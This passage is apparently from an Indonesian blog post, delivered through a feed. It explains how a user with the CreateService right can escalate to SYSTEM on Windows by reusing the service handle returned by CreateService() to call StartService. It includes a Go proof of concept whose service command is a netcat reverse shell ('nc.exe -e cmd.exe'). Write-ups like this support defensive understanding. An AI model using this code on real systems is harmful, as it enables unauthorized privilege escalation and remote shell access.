-<li>Handle SCM bersama dengan argumen lainnya yang disuplai seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan di-passing ke fungsi  <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">CreateService()</a> untuk membuat service. Fungsi <code>CreateService()</code> ini memiliki return value berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service">disini</a>.</li>
-<li>Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li>
-</ol>
-<p>Kalau kita mengacu pada dokumentasi Microsoft, akses handle SCM adalah <code>SC_MANAGER_ALL_ACCESS</code> (perlu elevated process). Sedangkan untuk user dengan hak CreateService, akses handlenya adalah <code>SC_MANAGER_CREATE_SERVICE</code>.</p>
-<p>Handle SCM menentukan apakah kita dapat melakukan read write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM.</p>
-<h2 id="service-control">Service Control</h2>
-<p>Service yang berhasil dibuat oleh user menggunakan <code>sc.exe</code> dalam mode elevated atau user dengan hak CreateService tidak akan bisa dikontrol (start, stop) oleh <u>normal user</u> karena ya secara default, normal user <strong>tidak punya akses</strong>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc start MyService
-<span class="o">[</span>SC<span class="o">]</span> StartService: OpenService FAILED 5:
-
-Access is denied.
-</code></pre></div><p>Tahapan saat menjalankan sebuah service seperti diatas sendiri, secara garis besar adalah seperti berikut:</p>
-<ol>
-<li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li>
-<li>Handle SCM kemudian di-passing ke fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew">OpenService()</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li>
-<li>Handle SVC yang didapat dipassing ke <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew">StartService</a> untuk mulai menjalankan service.</li>
-</ol>
-<p>Dari ketiga tahap  menjalankan service tersebut, normal user akan mendapatkan galat berupa &ldquo;Access is denied&rdquo; pada tahap 2 karena handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p>
-<h4 id="start-a-service-using-createservice-service-handle">Start a Service using CreateService Service Handle</h4>
-<p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi <code>CreateSevice()</code> dipanggil, ternyata si pembuat (level admin atau user dengan hak CreateService) service bisa <strong>menentukan level akses</strong> dirinya terhadap service yang dibuat dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.</p>
-<p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah <code>SERVICE_ALL_ACCESS</code> (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).</p>
-<p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang dilakukan oleh 0xdf dan VbScrub!</p>
-<p>VbScrub juga menuliskan sebuah code untuk mendemonstrasikan temuannya <a href="https://github.com/VbScrub/ServiceInstallerTest">disini</a> sedangkan berikut adalah code yang saya tulis dalam bahasa Go.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
-
-<span class="kn">import</span> <span class="s">&#34;golang.org/x/sys/windows&#34;</span>
-
-<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="c1">// Creation of a Service: STEP 1
-</span><span class="c1"></span>	<span class="c1">// Connect to scm to get a handle to create a service
-</span><span class="c1"></span>	<span class="nx">scmHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">OpenSCManager</span><span class="p">(</span><span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">SC_MANAGER_CREATE_SERVICE</span><span class="p">)</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error cannot create a service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-	<span class="p">}</span>
-
-	<span class="c1">// define service
-</span><span class="c1"></span>	<span class="nx">serviceName</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">&#34;MyService&#34;</span><span class="p">)</span>
-	<span class="nx">serviceExecPath</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class="p">)</span>
-
-	<span class="c1">// Creation of a ervice: STEP 2
-</span><span class="c1"></span>	<span class="c1">// Create a service
-</span><span class="c1"></span>	<span class="nx">svcHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">CreateService</span><span class="p">(</span>
-		<span class="nx">scmHandle</span><span class="p">,</span>                         <span class="c1">// SCM database
-</span><span class="c1"></span>		<span class="nx">serviceName</span><span class="p">,</span>                       <span class="c1">// name of service
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// service name to display
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
-</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
-</span><span class="c1"></span>		<span class="nx">serviceExecPath</span><span class="p">,</span>                   <span class="c1">// path to service&#39;s binary
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no load ordering group
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no tag identifier
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no dependencies
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// LocalSystem account
-</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no password
-</span><span class="c1"></span>	<span class="p">)</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;err&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-	<span class="p">}</span>
-
-	<span class="c1">// Creation of a Service: STEP 3
-</span><span class="c1"></span>	<span class="c1">// Don&#39;t close the svcHandle, instead send it to StartService
-</span><span class="c1"></span>	<span class="k">if</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">StartService</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error Starting service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
-		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-	<span class="p">}</span>
-    <span class="c1">// Creation of a Service: STEP 4
-</span><span class="c1"></span>    <span class="c1">// Finally close the handles
-</span><span class="c1"></span>    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">)</span>
-    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseHandle</span><span class="p">(</span><span class="nx">scmHandle</span><span class="p">)</span>
-<span class="p">}</span>
-</code></pre></div><p>Hasilnya?</p>
-<p>SYSTEM!</p>
-<p><div class="img-container"><img src="imgs/image-20210813011334034.png" alt="image-20210813011334034"  /></div>
-</p>
-<blockquote>
-<p>Programnya versi argumen, bisa di cek <a href="https://github.com/fahmifj/winapi-go">disini</a>.</p>
-</blockquote>
-<p><em>Tapi, kenapa harus custom code?</em></p>
-<p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create
-DESCRIPTION:
-        Creates a service entry in the registry and Service Database.
-USAGE:
-        sc &lt;server&gt; create <span class="o">[</span>service name<span class="o">]</span> <span class="o">[</span><span class="nv">binPath</span><span class="o">=</span> <span class="o">]</span> &lt;option1&gt; &lt;option2&gt;...
-
-OPTIONS:
-NOTE: The option name includes the equal sign.
-      A space is required between the equal sign and the value.
- <span class="nv">type</span><span class="o">=</span> &lt;own<span class="p">|</span>share<span class="p">|</span>interact<span class="p">|</span>kernel<span class="p">|</span>filesys<span class="p">|</span>rec<span class="p">|</span>userown<span class="p">|</span>usershare&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> own<span class="o">)</span>
- <span class="nv">start</span><span class="o">=</span> &lt;boot<span class="p">|</span>system<span class="p">|</span>auto<span class="p">|</span>demand<span class="p">|</span>disabled<span class="p">|</span>delayed-auto&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> demand<span class="o">)</span>
- <span class="nv">error</span><span class="o">=</span> &lt;normal<span class="p">|</span>severe<span class="p">|</span>critical<span class="p">|</span>ignore&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> normal<span class="o">)</span>
- <span class="nv">binPath</span><span class="o">=</span> &lt;BinaryPathName to the .exe file&gt;
- <span class="nv">group</span><span class="o">=</span> &lt;LoadOrderGroup&gt;
- <span class="nv">tag</span><span class="o">=</span> &lt;yes<span class="p">|</span>no&gt;
- <span class="nv">depend</span><span class="o">=</span> &lt;Dependencies<span class="o">(</span>separated by / <span class="o">(</span>forward slash<span class="o">))</span>&gt;
- <span class="nv">obj</span><span class="o">=</span> &lt;AccountName<span class="p">|</span>ObjectName&gt;
-       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> LocalSystem<span class="o">)</span>
- <span class="nv">DisplayName</span><span class="o">=</span> &lt;display name&gt;
- <span class="nv">password</span><span class="o">=</span> &lt;password&gt;
-</code></pre></div><h4 id="jadi--">Jadi &hellip; ?</h4>
-<p>Seperti di postnya, VbScrub bilang hal ini kemungkinan bukan security issue. Tapi kalau balik lagi dan mengacu ke <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?">dokumentasi Microsoft</a>-nya, bisa disimpulkan secara tidak langsung kalau user dengan hak CreateService ini masih termasuk admin.</p>
-<p><div class="img-container"><img src="imgs/image-20210812194031337.png" alt="image-20210812194031337"  /></div>
-</p>
-<p>Intinya disini kita butuh hak CreateService (SC_MANAGER_CREATE_SERVICE) dan custom compiled program jika tidak mau menunggu reboot, karena pembuatan service menggunakan <code>sc.exe</code>  sudah pasti handle SVCnya ditutup. Jadi setidaknya, &ldquo;start up type&rdquo; si service harus di set ke <code>automatic on boot</code>.</p>
-<p>Sekian~</p>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></li>
-<li><a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html">https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></li>
-<li><a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights</a></li>
-<li><a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service</a></li>
-<li><a href="https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service">https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service</a></li>
-</ul>
-]]></content:encoded>
     </item>
     
   </channel>
